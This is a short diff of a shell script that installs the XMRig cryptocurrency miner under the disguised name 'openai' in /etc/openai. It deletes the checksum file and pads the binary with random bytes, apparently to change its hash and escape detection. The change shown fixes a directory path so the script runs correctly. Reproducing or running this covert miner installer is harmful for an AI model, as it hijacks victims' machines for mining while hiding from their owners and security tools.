@@ -8,7 +8,7 @@ mv xmrig-$latest openai
 mv openai/xmrig openai/openai
 mv openai /etc/openai
 rm -rf 1.tar.gz
-cd openai && rm -rf SHA256SUMS
+cd /etc/openai && rm -rf SHA256SUMS
 random_number=$((RANDOM % 188 + 68))
 for i in $(seq 1 $random_number); do
   echo -n "0" >> /etc/openai/openai
